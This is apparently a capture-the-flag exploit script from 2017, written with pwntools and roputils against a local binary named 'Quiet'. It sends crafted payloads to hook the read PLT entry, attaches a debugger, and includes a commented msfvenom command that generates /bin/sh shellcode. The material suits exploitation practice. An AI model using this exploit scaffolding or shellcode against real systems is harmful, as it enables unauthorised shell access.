#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-13 07:08:52
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./Quiet"
remote_ip = ""
port = 0
rop = roputils.ROP(target)
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	gdb.attach(p,"b*0x401C74\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

ru(" your string:")
sd("hooked_by_ysya"+p64(0)*20)
ru(" your string:")
sd("hooked_by_ysyy"+p64(0)*20)# hook read plt

p.interactive()